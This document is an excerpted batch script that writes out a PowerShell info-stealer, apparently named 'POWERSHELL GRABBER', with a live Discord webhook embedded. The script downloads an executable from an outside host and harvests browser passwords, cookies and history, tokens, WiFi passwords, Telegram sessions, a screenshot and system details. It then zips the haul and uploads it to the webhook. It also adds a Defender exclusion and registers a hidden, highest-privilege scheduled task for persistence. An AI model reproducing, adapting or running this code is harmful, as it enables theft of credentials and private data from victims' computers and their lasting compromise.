...
echo $webhook = "https://discord.com/api/webhooks/1178843422342266950/rrDKeytvUEhSCqrHYBArpw2-RrOI6VL0PKwmT19kRLiqhohlBXPVdrkK253i_AHT_2v_" >> powershell123.ps1
...
echo "username" = "system" >> powershell123.ps1
echo "content" = "@everyone" >> powershell123.ps1
echo "title" = "system" >> powershell123.ps1
...
echo "url" = "https://github.com/876N" >> powershell123.ps1
echo "description" = "New victim info collected !" >> powershell123.ps1
echo "color" = "16711680" >> powershell123.ps1
echo "footer" = @{ >> powershell123.ps1
echo "text" = "Made by Freemasonry" >> powershell123.ps1
echo } >> powershell123.ps1
...
echo curl.exe -F "payload_json={\`"username\`": \`"system\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\desktop-screenshot.png\`"" $webhook ^| out-null >> powershell123.ps1
...
echo } >> powershell123.ps1
echo $TEMP_KOT = Test-Path "$env:LOCALAPPDATA\Temp\system" >> powershell123.ps1
echo if ($TEMP_KOT -eq $false) { >> powershell123.ps1
echo New-Item "$env:LOCALAPPDATA\Temp\system" -Type Directory >> powershell123.ps1
echo } >> powershell123.ps1
echo $ProgressPreference = "SilentlyContinue";Invoke-WebRequest -Uri "https://files.cerya.eu/main.exe" -OutFile "main.exe" -UseBasicParsing >> powershell123.ps1
...
echo Move-Item -Path "$extracted\ip.txt" -Destination "$extracted\system\ip.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\netstat.txt" -Destination "$extracted\system\netstat.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\system_info.txt" -Destination "$extracted\system\system_info.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\uuid.txt" -Destination "$extracted\system\uuid.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\mac.txt" -Destination "$extracted\system\mac.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\browser-cookies.txt" -Destination "$extracted\system\browser-cookies.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\browser-history.txt" -Destination "$extracted\system\browser-history.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\browser-passwords.txt" -Destination "$extracted\system\browser-passwords.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\desktop-screenshot.png" -Destination "$extracted\system\desktop-screenshot.png" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\tokens.txt" -Destination "$extracted\system\tokens.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\WIFIPasswords.txt" -Destination "$extracted\system\WIFIPasswords.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\GPU.txt" -Destination "$extracted\system\GPU.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\Installed-Applications.txt" -Destination "$extracted\system\Installed-Applications.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\DiskInfo.txt" -Destination "$extracted\system\DiskInfo.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\CPU.txt" -Destination "$extracted\system\CPU.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\NetworkAdapters.txt" -Destination "$extracted\system\NetworkAdapters.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\ProductKey.txt" -Destination "$extracted\system\ProductKey.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\system\StartUpApps.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\system\running-services.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\system\running-applications.txt" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\system\telegram-session.zip" -ErrorAction SilentlyContinue >> powershell123.ps1
echo Compress-Archive -Path "$extracted\system" -DestinationPath "$extracted\system.zip" -Force >> powershell123.ps1
echo curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\system.zip" $webhook >> powershell123.ps1
echo Remove-Item "$extracted\system.zip" >> powershell123.ps1
echo Remove-Item "$extracted\system" -Recurse >> powershell123.ps1
...
echo Add-MpPreference -ExclusionPath "$env:APPDATA\system" >> powershell123.ps1
echo New-Item -ItemType Directory -Path "$env:APPDATA\system" -Force >> powershell123.ps1
echo $origin = $PSCommandPath >> powershell123.ps1
echo Copy-Item -Path $origin -Destination "$env:APPDATA\system\system.ps1" -Force >> powershell123.ps1
echo $task_name = "system" >> powershell123.ps1
echo $task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument 'vbscript:createobject("wscript.shell").run("PowerShell.exe -ExecutionPolicy Bypass -File %%appdata%%\system\system.ps1",0)(window.close)' >> powershell123.ps1
...
echo Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "system" -RunLevel Highest -Force >> powershell123.ps1
